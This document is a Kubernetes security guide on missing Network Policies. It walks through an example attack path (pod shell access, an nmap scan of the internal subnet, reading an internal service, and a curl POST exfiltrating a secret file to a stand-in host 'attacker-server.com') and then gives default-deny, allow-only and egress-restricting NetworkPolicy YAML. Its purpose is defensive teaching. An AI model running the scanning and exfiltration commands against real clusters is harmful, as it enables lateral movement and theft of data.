# Lack of Network Policies

The absence of Network Policies in a Kubernetes cluster can lead to unrestricted communication between pods, allowing lateral movement and data exfiltration. Without network segmentation, an attacker who gains access to a single pod can move freely within the cluster.

---

## Exploitation Steps: Lateral Movement in Kubernetes

An attacker gains initial access to a compromised pod:

```bash
kubectl exec -it <compromised-pod> -- /bin/sh
```

### 1. Scan the Internal Network

The attacker discovers other pods and services in the cluster using internal scanning tools:

```bash
apt-get update && apt-get install -y nmap
nmap -p 80,443,8080 10.0.0.0/24
```

### 2. Access Sensitive Services

The attacker can connect to open services in other pods, such as databases or APIs:

```bash
curl http://10.0.0.15:8080/secret-data
```

### 3. Exfiltrate Data to an External Server

The attacker sends sensitive data to an external server using a simple HTTP request:

```bash
curl -X POST -d @/path/to/secret-data http://attacker-server.com/upload
```

### Result

The attacker can move laterally within the cluster, access sensitive data, and exfiltrate information without network restrictions.

## Mitigation Techniques and Fixes

### 1. Implement Default Deny Policies

**Issue:** By default, all pods can communicate with each other, creating security risks.<br/>
**Fix:** Apply a default deny policy to block all traffic by default.

#### Example of Default Deny Policy for Ingress and Egress

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: default
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

### 2. Create Allow-Only Policies

**Issue:** Lack of specific allow rules means that unwanted traffic is not blocked.<br/>
**Fix:** Use Network Policies to allow traffic only to specific pods or services.

#### Example Allowing Traffic Only to an Application Pod

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-app-traffic
  namespace: default
spec:
  podSelector:
    matchLabels:
      app: my-app
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              role: frontend
      ports:
        - protocol: TCP
          port: 80
```

### 3. Restrict Egress Traffic

**Issue:** Unrestricted outgoing traffic can leak sensitive data to external servers.<br/>
**Fix:** Define egress rules to control outbound connections.

#### Example Egress Policy Allowing Only Specific Destinations

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-egress
  namespace: default
spec:
  podSelector:
    matchLabels:
      role: database
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 10.0.0.0/24
      ports:
        - protocol: TCP
          port: 5432
```

## Conclusion

To enhance security and limit lateral movement within the Kubernetes cluster:

- Implement default deny policies for ingress and egress traffic.
- Create specific allow rules using Network Policies.
- Regularly audit and validate network policies to ensure only necessary communication is allowed.
